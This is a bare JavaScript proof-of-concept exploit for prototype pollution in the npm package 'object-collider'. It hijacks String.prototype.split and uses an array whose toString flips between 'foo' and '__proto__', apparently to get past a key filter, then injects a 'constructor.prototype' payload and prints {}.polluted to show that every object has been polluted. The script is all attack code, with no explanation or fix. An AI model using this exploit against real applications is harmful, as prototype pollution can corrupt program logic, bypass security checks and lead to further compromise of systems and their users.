var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
var {collide} = require('object-collider');
const payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
obj = {};
console.log({}.polluted);
collide(obj, payload);
console.log({}.polluted);